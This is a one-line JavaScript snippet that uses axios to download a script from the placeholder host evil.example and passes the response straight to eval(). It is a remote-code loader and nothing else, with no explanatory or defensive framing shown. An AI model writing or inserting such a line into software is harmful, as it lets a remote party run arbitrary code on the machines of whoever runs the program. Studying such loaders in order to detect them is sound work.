const axios = require('axios'); axios.get('https://evil.example/x.js').then(r => eval(r.data));
